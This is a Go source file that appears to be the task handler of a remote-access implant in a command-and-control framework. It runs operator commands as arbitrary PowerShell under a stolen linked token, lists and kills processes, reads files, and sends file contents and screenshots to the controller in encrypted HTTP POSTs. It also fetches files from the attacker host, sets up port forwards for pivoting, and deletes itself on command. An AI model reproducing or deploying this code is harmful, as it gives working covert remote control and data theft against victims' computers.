package check

import (
	"bytes"
	"dingo/hg"
	"dingo/initialization"
	"dingo/tasks"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"net/http"
	"os"
	"path"
	"strconv"
	"strings"
	"time"

	selfdelete "github.com/secur30nly/go-self-delete"
	"github.com/vova616/screenshot"
)

var PortFwdMap = make(map[int]string)
var PortFwdListenerMap = make(map[int]net.Listener)
var PortFwdListenerQuitMap = make(map[int](chan bool))

var Token, _ = hg.GetCurrentToken()
var TokenLinked, _ = Token.GetLinkedToken()

func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
	for _, task := range tasksToDo {
		var data string

		taskSplit := strings.Split(task, " - ")
		task = taskSplit[0]
		taskData := taskSplit[1]

		switch task {
		case "shell":
			data, _ = hg.PsReturnT(taskData, TokenLinked)
		case "whoami":
			data, _ = initialization.GetUsername()
		case "hostname":
			data, _ = hg.GetHostname()
		case "ps":
			data, _ = hg.PsReturnT("tasklist", TokenLinked)
		case "ifconfig":
			data, _ = hg.PsReturnT("ipconfig", TokenLinked)
		case "kill":
			pid := taskData
			hg.PsNoOutT("Stop-Process -Id "+pid, TokenLinked)
			data = fmt.Sprintf("killed process (%s)", pid)
		case "cat":
			data, _ = hg.PsReturnT("type "+taskData, TokenLinked)
		case "sleep":
			newSleepTime := taskData
			*sleep, _ = strconv.Atoi(newSleepTime)
			data = fmt.Sprintf("changed sleep to %s (will update next callback)", newSleepTime)
		case "upload":
			taskDataSplit := strings.Split(taskData, " ")
			uFile := taskDataSplit[0]
			dPath := taskDataSplit[1]

			url := fmt.Sprintf("http://%s:4458/files/%s", rhost, uFile)

			err := hg.DownFile(url, dPath)
			if err != nil {
				data = err.Error()
				break
			}

			data = "successfully uploaded file"
		case "download":
			data = "successfully download file"
			data += " //SPLIT// "
			data += path.Base(taskData)
			data += " //END NAME// "
			fileData, _ := hg.ReadFileToString(taskData)
			data += fileData
		case "screenshot":
			img, err := screenshot.CaptureScreen()
			if err != nil {
				data = err.Error()
				break
			}

			file, err := os.Create("./temp.png")
			if err != nil {
				data = err.Error()
				break
			}

			err = png.Encode(file, img)
			if err != nil {
				data = err.Error()
				hg.DeleteFile("./temp.png")
				break
			}
			file.Close()

			filename := "ss_" + fmt.Sprintf("%d", time.Now().Unix()) + ".png"
			data = fmt.Sprintf("screenshot saved as (%s)", filename)
			data += " //SPLIT// "
			data += filename
			data += " //END NAME// "
			fileData, _ := hg.ReadFileToString("./temp.png")
			data += fileData

			hg.DeleteFile("./temp.png")
		case "pwd":
			data, _ = hg.GetPwd()
		case "ls":
			data, _ = hg.PsReturnT("dir "+taskData, TokenLinked)
		case "cd":
			os.Chdir(taskData)
			data = fmt.Sprintf("changed directory to %s", taskData)
		case "portfwd":
			if strings.HasPrefix(taskData, "add") {
				taskDataSplit := strings.Split(taskData, " / ")
				lport := taskDataSplit[1]
				rport := taskDataSplit[2]
				rhost := taskDataSplit[3]

				forwardingRuleString := fmt.Sprintf("0.0.0.0:%s -> %s:%s", lport, rhost, rport)

				PortFwdMap[len(PortFwdMap)] = forwardingRuleString

				// start forwarder
				forwarder, err := net.Listen("tcp", fmt.Sprintf(":%s", lport))
				if err != nil {
					data = err.Error()
					break
				}

				// listen for connections
				quit := make(chan bool)
				go func(s net.Listener, rhost string, rport string) {
					for {
						select {
						case <-quit:
							s.Close()
							return
						default:
							client, _ := s.Accept()
							go handleForward(client, rhost, rport)
						}
					}
				}(forwarder, rhost, rport)

				PortFwdListenerMap[len(PortFwdListenerMap)] = forwarder
				PortFwdListenerQuitMap[len(PortFwdListenerQuitMap)] = quit

				data = "added new port forwarding rule"
			} else if strings.HasPrefix(taskData, "del") {
				taskDataSplit := strings.Split(taskData, " / ")
				id := taskDataSplit[1]
				intId, err := strconv.Atoi(id)
				if err != nil {
					data = err.Error()
					break
				}

				PortFwdListenerQuitMap[intId] <- false
				PortFwdMap[intId] = PortFwdMap[intId] + " (killed)"

				data = fmt.Sprintf("killed port forwarding rule ([%d] %s)\nthis may temporarily kill your session", intId, PortFwdMap[intId])
			} else if strings.HasPrefix(taskData, "list") {
				for key, value := range PortFwdMap {
					data += fmt.Sprintf("[%d] %s\n", key, value)
				}
			} else if strings.HasPrefix(taskData, "clear") {
				for key := range PortFwdListenerMap {
					PortFwdListenerQuitMap[key] <- false
					PortFwdMap[key] = PortFwdMap[key] + " (killed)"
				}

				data = "killed all port forwarding rules\nthis may temporarily kill your session"
			}
		case "died":
			data = "died"
		case "":

		default:
			data = "command not supported"
		}

		if !strings.Contains(data, " //SPLIT// ") {
			data += " //SPLIT// "
		}

		rawJsonData := tasks.HttpTaskPostRequest{
			Task: task,
			Data: data,
		}

		jsonData, _ := json.Marshal(rawJsonData)
		jsonDataEncrypted, _ := initialization.EncryptString(key, string(jsonData))

		client := &http.Client{}
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))

		req.Header.Add("AgentID", agentid)
		req.Header.Add("CallType", "Task")
		req.Header.Set("User-Agent", useragent)
		req.Header.Add("SLEEP", fmt.Sprint(*sleep))
		req.Header.Add("Name", beacon_name)

		client.Do(req)

		// kill self if die command used
		if data == "died" {
			selfdelete.SelfDeleteExe()
			os.Exit(2)
		}
	}
}

func handleForward(conn net.Conn, rhost string, rport string) {
	remoteAdr := rhost + ":" + rport
	remote, _ := net.Dial("tcp", remoteAdr)

	go forward(conn, remote)
	go forward(remote, conn)
}

func forward(src, dest net.Conn) {
	io.Copy(src, dest)
}
